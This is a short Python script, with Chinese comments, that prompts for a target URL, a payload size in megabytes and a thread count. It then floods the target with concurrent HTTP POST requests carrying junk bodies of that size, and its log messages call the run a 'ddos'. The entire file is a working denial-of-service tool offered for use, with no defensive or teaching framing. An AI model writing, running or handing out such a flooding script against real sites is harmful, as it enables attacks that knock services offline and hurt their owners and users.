import requests
import threading
import time as tm
print("<",tm.strftime("%Y-%m-%d %H:%M:%S"),"><SYSTEM>start prepare bag")
url = input("<PREPARE>input url:")  # 替换为目标网站的URL
mb=input("<PREPARE>input mb:")
time=input("<PREPARE>input time:")
data = "x" * (int(mb)*1024 * 1024)
threads=[]
print("<",tm.strftime("%Y-%m-%d %H:%M:%S"),"><SYSTEM>start ddos")
n=0
response=""
def func1():
    try:
        global response
        response = requests.post("http://"+url, data=data)
        print("<",tm.strftime("%Y-%m-%d %H:%M:%S"),"><WELL>ddos well in:"+str(response.status_code))  # 打印响应状态码
    except Exception as e:
        print("<",tm.strftime("%Y-%m-%d %H:%M:%S"),"><BAD>error in ddos of",type(e).__name__)

for i in range(int(time)):
    n+=1
    th=threading.Thread(target=func1)
    threads.append(th)
    th.start()
    print("<",tm.strftime("%Y-%m-%d %H:%M:%S"),"><THREAD>thread"+str(n)+"started")
for t in threads:
    t.join()
print("<",tm.strftime("%Y-%m-%d %H:%M:%S"),"><SYSTEM>ddos finished. ")

